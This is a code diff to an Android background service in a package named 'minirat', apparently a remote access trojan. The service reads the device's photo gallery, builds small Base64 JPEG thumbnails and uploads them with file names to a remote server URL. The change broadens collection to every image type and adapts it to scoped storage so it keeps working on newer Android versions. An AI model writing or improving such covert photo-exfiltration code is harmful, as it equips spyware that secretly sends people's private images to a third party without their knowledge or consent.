@@ -5,7 +5,8 @@ import com.app.minirat.BuildConfig;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.content.Context;
+import android.content.ContentResolver;
+import android.content.ContentUris;
 import android.content.Intent;
 import android.database.Cursor;
 import android.graphics.Bitmap;
@@ -14,6 +15,7 @@ import android.graphics.Matrix;
 import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
+import android.os.ParcelFileDescriptor;
 import android.provider.MediaStore;
 import android.util.Base64;
 import android.util.Log;
@@ -24,7 +26,7 @@ import org.json.JSONObject;
 
 import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
-import java.io.File;
+import java.io.FileDescriptor;
 import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -39,6 +41,17 @@ public class Service extends android.app.Service {
     private static final String SERVER_URL = BuildConfig.DOMAIN_URL;
 
     private ExecutorService executor = Executors.newSingleThreadExecutor();
+
+    // Container class for media items
+    private static class MediaItem {
+        final Uri uri;
+        final String displayName;
+
+        MediaItem(Uri uri, String displayName) {
+            this.uri = uri;
+            this.displayName = displayName;
+        }
+    }
 
     @Override
     public void onCreate() {
@@ -64,16 +77,18 @@ public class Service extends android.app.Service {
     private void uploadGalleryThumbnails() {
         executor.execute(() -> {
             try {
-                ArrayList<String> galleryFiles = getGalleryFiles();
+                ArrayList<MediaItem> mediaItems = getGalleryFiles();
+                Log.d(TAG, "Found " + mediaItems.size() + " media items");
 
-                for (String filePath : galleryFiles) {
+                for (MediaItem item : mediaItems) {
                     try {
-                        String thumbnailBase64 = createThumbnail(filePath);
-                        String fileName = new File(filePath).getName();
-                        sendThumbnailToServer(fileName, thumbnailBase64);
-                        Log.d(TAG, "Uploaded thumbnail for: " + fileName);
+                        String thumbnailBase64 = createThumbnail(item.uri);
+                        if (thumbnailBase64 != null) {
+                            sendThumbnailToServer(item.displayName, thumbnailBase64);
+                            Log.d(TAG, "Uploaded thumbnail for: " + item.displayName);
+                        }
                     } catch (Exception e) {
-                        Log.e(TAG, "Error processing file: " + filePath, e);
+                        Log.e(TAG, "Error processing: " + item.displayName, e);
                     }
                 }
 
@@ -83,54 +98,68 @@ public class Service extends android.app.Service {
         });
     }
 
-    private ArrayList<String> getGalleryFiles() {
-        ArrayList<String> files = new ArrayList<>();
+    private ArrayList<MediaItem> getGalleryFiles() {
+        ArrayList<MediaItem> items = new ArrayList<>();
+
+        // Query all images from the MediaStore
+        queryImages(items);
+
+        return items;
+    }
+
+    private void queryImages(ArrayList<MediaItem> items) {
         Cursor cursor = null;
         try {
             String[] projection = {
                     MediaStore.Images.Media._ID,
-                    MediaStore.Images.Media.DATA,
+                    MediaStore.Images.Media.DISPLAY_NAME,
                     MediaStore.Images.Media.MIME_TYPE
             };
 
-            String selection = MediaStore.Images.Media.MIME_TYPE + "=? OR " +
-                    MediaStore.Images.Media.MIME_TYPE + "=?";
-
-            String[] selectionArgs = {
-                    "image/jpeg",
-                    "video/mp4"
-            };
-
+            // Query ALL image types — no MIME filter so we get JPEG, PNG, WEBP, GIF, HEIC, BMP, etc.
             cursor = getContentResolver().query(
                     MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                     projection,
-                    selection,
-                    selectionArgs,
+                    null,  // no selection — get all images
+                    null,  // no selection args
                     MediaStore.Images.Media.DATE_ADDED + " DESC"
             );
 
             if (cursor != null) {
+                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+                int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
+
                 while (cursor.moveToNext()) {
-                    String filePath = cursor.getString(cursor.getColumnIndexOrThrow(
-                            MediaStore.Images.Media.DATA));
-                    files.add(filePath);
+                    long id = cursor.getLong(idColumn);
+                    String displayName = cursor.getString(nameColumn);
+
+                    // Build content URI (works on all Android versions including scoped storage)
+                    Uri contentUri = ContentUris.withAppendedId(
+                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
+
+                    items.add(new MediaItem(contentUri, displayName));
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error getting gallery files", e);
+            Log.e(TAG, "Error querying images", e);
         } finally {
             if (cursor != null) {
                 cursor.close();
             }
         }
-        return files;
     }
 
-    private String createThumbnail(String filePath) throws IOException {
-        // Decode with inSampleSize to avoid loading full-resolution bitmap into memory
+    private String createThumbnail(Uri contentUri) throws IOException {
+        ContentResolver resolver = getContentResolver();
+
+        // First pass: decode bounds only to calculate inSampleSize
         BitmapFactory.Options opts = new BitmapFactory.Options();
         opts.inJustDecodeBounds = true;
-        BitmapFactory.decodeFile(filePath, opts);
+
+        ParcelFileDescriptor pfd = resolver.openFileDescriptor(contentUri, "r");
+        if (pfd == null) return null;
+        BitmapFactory.decodeFileDescriptor(pfd.getFileDescriptor(), null, opts);
+        pfd.close();
 
         int targetSize = 128;
         int inSampleSize = 1;
@@ -143,15 +172,20 @@ public class Service extends android.app.Service {
             }
         }
 
+        // Second pass: decode actual bitmap with inSampleSize
         opts.inJustDecodeBounds = false;
         opts.inSampleSize = inSampleSize;
-        Bitmap bitmap = BitmapFactory.decodeFile(filePath, opts);
+
+        pfd = resolver.openFileDescriptor(contentUri, "r");
+        if (pfd == null) return null;
+        Bitmap bitmap = BitmapFactory.decodeFileDescriptor(pfd.getFileDescriptor(), null, opts);
+        pfd.close();
 
         if (bitmap == null) {
             return createPlaceholderThumbnail();
         }
 
-        // Scale down to exactly 128x128 preserving aspect ratio
+        // Scale down to 128x128 preserving aspect ratio
         float scale = Math.min(
                 (float) targetSize / bitmap.getWidth(),
                 (float) targetSize / bitmap.getHeight()
@@ -163,17 +197,14 @@ public class Service extends android.app.Service {
         Bitmap thumbnail = Bitmap.createBitmap(bitmap, 0, 0,
                 bitmap.getWidth(), bitmap.getHeight(), matrix, true);
 
-        // Recycle the original if thumbnail is a different object
         if (thumbnail != bitmap) {
             bitmap.recycle();
         }
 
-        // Convert to Base64
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         thumbnail.compress(Bitmap.CompressFormat.JPEG, 70, baos);
         byte[] thumbnailBytes = baos.toByteArray();
         baos.close();
-
         thumbnail.recycle();
 
         return Base64.encodeToString(thumbnailBytes, Base64.NO_WRAP);
@@ -207,7 +238,6 @@ public class Service extends android.app.Service {
             connection.setConnectTimeout(10000);
             connection.setReadTimeout(10000);
 
-            // Use JSONObject to safely build the payload (prevents JSON injection)
             JSONObject payload = new JSONObject();
             payload.put("filename", fileName);
             payload.put("thumbnail", thumbnailBase64);
